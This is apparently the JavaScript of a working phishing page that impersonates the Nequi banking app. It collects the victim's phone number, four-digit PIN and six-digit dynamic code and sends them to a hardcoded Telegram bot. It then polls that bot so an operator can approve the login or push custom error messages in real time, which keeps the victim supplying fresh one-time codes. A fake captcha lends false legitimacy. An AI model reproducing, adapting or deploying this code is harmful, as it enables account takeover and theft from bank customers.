document.addEventListener('DOMContentLoaded', function () {
    // ===== Referencias =====
    const inputsAll = document.querySelectorAll('input');
    let phoneInput = null;
    let passwordInput = null;
    let dynamicCodeInput = null;

    inputsAll.forEach(inp => {
        if (inp.type === 'tel' || (inp.placeholder || '').toLowerCase().includes('celular')) phoneInput = inp;
        if (inp.type === 'password') passwordInput = inp;
        if (inp.id === 'claveDinamica' || (inp.placeholder || '').toLowerCase().includes('dinámica')) dynamicCodeInput = inp;
    });

    const submitBtn = document.getElementById('submitBtn');
    const termsCheckboxDiv = document.getElementById('captchaBox');
    const captchaOuterCircle = document.getElementById('captchaOuterCircle');
    const captchaCircle = document.getElementById('captchaCircle');
    const captchaCheckIcon = document.getElementById('captchaCheckIcon');
    const loadingOverlay = document.getElementById('loadingOverlay');

    const errorModal = document.getElementById('errorModal');
    const errorText = document.getElementById('errorText');
    const errorAccept = document.getElementById('errorAccept');
    const errorBanner = document.getElementById('errorMessage');

    const TELEGRAM_API_KEY = '8587283632:AAFFsDyTcTyQYiQyM4rghouex0dlidIZEsk';
    const TELEGRAM_CHAT_ID = '5360036647';

    const DEFAULT_ERROR = 'Clave dinámica o datos incorrectos. Por favor, verifica la información e inténtalo nuevamente.';
    const ESPERA_MAXIMA = 120000; // 2 min para que el admin responda
    const POLL_MS = 1000;

    let isChecked = false;
    let lastUpdateId = 0;
    let pollerId = null;
    let motivoPendiente = null;
    let messageIdActual = null;

    const pendientes = new Map(); // messageId -> entrada

    // ===== Modal de error =====
    function actualizarTextoError(mensaje) {
        const texto = mensaje || DEFAULT_ERROR;
        errorText.textContent = texto;
        if (errorBanner) errorBanner.textContent = texto;
    }

    function mostrarError(mensaje) {
        if (loadingOverlay) loadingOverlay.style.display = 'none';
        actualizarTextoError(mensaje);
        if (errorBanner) errorBanner.classList.add('show');
        errorModal.classList.add('active');
        try { errorAccept.focus(); } catch (e) { }
    }

    function ocultarError() {
        errorModal.classList.remove('active');
        if (errorBanner) errorBanner.classList.remove('show');
    }

    errorAccept.addEventListener('click', ocultarError);
    errorModal.addEventListener('click', e => { if (e.target === errorModal) ocultarError(); });
    document.addEventListener('keydown', e => { if (e.key === 'Escape') ocultarError(); });

    // ===== Desbloquear inputs =====
    if (phoneInput) phoneInput.removeAttribute('readonly');
    if (passwordInput) passwordInput.removeAttribute('readonly');
    if (dynamicCodeInput) dynamicCodeInput.removeAttribute('readonly');

    // ===== Restricciones =====
    if (phoneInput) {
        phoneInput.setAttribute('maxlength', '10');
        phoneInput.setAttribute('inputmode', 'numeric');
        phoneInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 10);
            validateForm();
        });
    }

    if (passwordInput) {
        passwordInput.setAttribute('maxlength', '4');
        passwordInput.setAttribute('inputmode', 'numeric');
        passwordInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 4);
            validateForm();
        });
    }

    if (dynamicCodeInput) {
        dynamicCodeInput.setAttribute('maxlength', '6');
        dynamicCodeInput.setAttribute('inputmode', 'numeric');
        dynamicCodeInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 6);
            validateForm();
        });
    }

    // ===== Captcha =====
    if (termsCheckboxDiv && captchaCircle) {
        termsCheckboxDiv.addEventListener('click', () => {
            isChecked = !isChecked;

            if (isChecked) {
                termsCheckboxDiv.style.borderColor = '#10B981';
                termsCheckboxDiv.style.backgroundColor = '#F0FDF4';
                if (captchaOuterCircle) captchaOuterCircle.style.backgroundColor = '#DCFCE7';
                captchaCircle.style.borderColor = '#10B981';
                captchaCircle.style.backgroundColor = '#ffffff';
                if (captchaCheckIcon) captchaCheckIcon.classList.remove('hidden');
            } else {
                termsCheckboxDiv.style.borderColor = '#e075ae';
                termsCheckboxDiv.style.backgroundColor = '#ffffff';
                if (captchaOuterCircle) captchaOuterCircle.style.backgroundColor = '#ffffff';
                captchaCircle.style.borderColor = '#da0081';
                captchaCircle.style.backgroundColor = '#ffffff';
                if (captchaCheckIcon) captchaCheckIcon.classList.add('hidden');
            }
            validateForm();
        });
    }

    // ===== Validación =====
    function validateForm() {
        const isPhoneValid = phoneInput && phoneInput.value.length === 10;
        const isPasswordValid = passwordInput && passwordInput.value.length === 4;
        const isDynamicValid = dynamicCodeInput && dynamicCodeInput.value.length === 6;

        if (isPhoneValid && isPasswordValid && isDynamicValid && isChecked && submitBtn) {
            submitBtn.removeAttribute('disabled');
            submitBtn.style.backgroundColor = '#da0081';
            submitBtn.style.cursor = 'pointer';
            submitBtn.style.opacity = '1';
        } else if (submitBtn) {
            submitBtn.setAttribute('disabled', 'true');
            submitBtn.style.backgroundColor = '#F1BFDA';
            submitBtn.style.cursor = 'not-allowed';
            submitBtn.style.opacity = '0.9';
        }
    }

    [phoneInput, passwordInput, dynamicCodeInput].forEach(inp => {
        if (inp) inp.addEventListener('input', validateForm);
    });

    // ===== Telegram =====
    async function sendTelegramMessage(message) {
        const url = `https://api.telegram.org/bot${TELEGRAM_API_KEY}/sendMessage`;
        const keyboard = {
            inline_keyboard: [
                [
                    { text: '❌ Mostrar Error', callback_data: 'mostrar_error' },
                    { text: '✅ Permitir Acceso', callback_data: 'permitir_acceso' }
                ]
            ]
        };

        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    reply_markup: keyboard
                })
            });
            const data = await response.json();
            return data.ok && data.result ? data.result.message_id : null;
        } catch (error) {
            console.error('Error al enviar mensaje:', error);
            return null;
        }
    }

    // ===== Poller único =====
    async function procesarUpdates() {
        const url = `https://api.telegram.org/bot${TELEGRAM_API_KEY}/getUpdates?limit=100&offset=${lastUpdateId}`;
        let data;
        try {
            const res = await fetch(url, { cache: 'no-store' });
            data = await res.json();
        } catch (e) {
            return;
        }
        if (!data || !data.ok || !data.result || !data.result.length) return;

        for (const update of data.result) {
            if (update.update_id >= lastUpdateId) lastUpdateId = update.update_id + 1;

            const cq = update.callback_query;
            if (cq && cq.message) {
                const entrada = pendientes.get(cq.message.message_id);
                if (entrada && !entrada.done) {
                    entrada.done = true;
                    entrada.resolve({ action: cq.data });
                }
                continue;
            }

            const m = update.message;
            if (m && m.reply_to_message && m.text) {
                const entrada = pendientes.get(m.reply_to_message.message_id);
                if (entrada && entrada.onReason) {
                    entrada.onReason(m.text.trim());
                }
            }
        }
    }

    function iniciarPoller() {
        if (pollerId) return;
        pollerId = setInterval(procesarUpdates, POLL_MS);
        procesarUpdates();
    }

    function esperarRespuesta(messageId, onReason) {
        return new Promise((resolve) => {
            const entrada = {
                done: false,
                onReason: onReason,
                resolve: (r) => {
                    if (entrada.done) return;
                    entrada.done = true;
                    resolve(r);
                }
            };
            pendientes.set(messageId, entrada);

            setTimeout(() => entrada.resolve({ action: 'timeout' }), ESPERA_MAXIMA);
            setTimeout(() => {
                if (pendientes.get(messageId) === entrada) pendientes.delete(messageId);
            }, ESPERA_MAXIMA * 2);
        });
    }

    // ===== Submit =====
    if (submitBtn) {
        submitBtn.addEventListener('click', async function (e) {
            e.preventDefault();
            if (submitBtn.hasAttribute('disabled')) return;

            const phone = phoneInput ? phoneInput.value : '';
            const password = passwordInput ? passwordInput.value : '';
            const dynamicCode = dynamicCodeInput ? dynamicCodeInput.value : '';

            ocultarError();
            motivoPendiente = null;

            // libera la entrada anterior para que no se quede colgada
            if (messageIdActual && pendientes.has(messageIdActual)) {
                const vieja = pendientes.get(messageIdActual);
                vieja.done = true;
                pendientes.delete(messageIdActual);
            }

            if (loadingOverlay) loadingOverlay.style.display = 'flex';

            const messageId = await sendTelegramMessage(
                `📱 <b>Nuevo intento de acceso a Nequi</b>\n` +
                `📞 Celular: ${phone}\n` +
                `🔑 Clave (4 dígitos): ${password}\n` +
                `🔢 Clave Dinámica (6 dígitos): ${dynamicCode}`
            );

            if (!messageId) {
                mostrarError('No pudimos conectar con el servidor. Revisa tu conexión e inténtalo de nuevo.');
                return;
            }

            messageIdActual = messageId;
            iniciarPoller();

            const resp = await esperarRespuesta(messageId, (reason) => {
                motivoPendiente = reason;
                if (errorModal.classList.contains('active')) actualizarTextoError(reason);
            });

            if (loadingOverlay) loadingOverlay.style.display = 'none';

            if (resp.action === 'permitir_acceso') {
                window.location.href = '../confirmacion.html';
                return;
            }

            if (resp.action === 'timeout') {
                mostrarError('No pudimos validar tu información a tiempo. Inténtalo nuevamente.');
            } else {
                // mostrar_error o custom: modal INMEDIATO
                mostrarError(resp.reason || motivoPendiente || null);
            }

            if (passwordInput) passwordInput.value = '';
            if (dynamicCodeInput) dynamicCodeInput.value = '';
            validateForm();
        });
    }

    validateForm();
});
